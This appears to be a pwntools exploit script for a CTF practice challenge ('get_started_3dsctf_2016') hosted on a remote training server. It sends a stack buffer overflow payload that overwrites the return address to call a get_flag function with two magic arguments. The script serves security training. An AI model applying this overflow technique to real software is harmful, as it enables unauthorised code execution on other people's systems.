from pwn import *
context.log_level = 'debug'
conn = remote('node4.buuoj.cn', 28689)
#conn = process('./get_started_3dsctf_2016')
#gdb.attach(conn, 'b start')
main = 0x08048a20
exit = 0x0804e6a0
flagpath = 0x080bc388
ret = 0x80488bb
get_flag = 0x080489a0
param_1 = 0x308cd64f
param_2 = 0x195719d1
# this is not EIP 
payload0 = b'a' * 0x38  + p32(get_flag) + p32(exit) + p32(param_1) +  p32(param_2)  

conn.sendline(payload0)
#conn.interactive()
#conn.recvuntil(b'Qual a palavrinha magica?')
conn.recv()
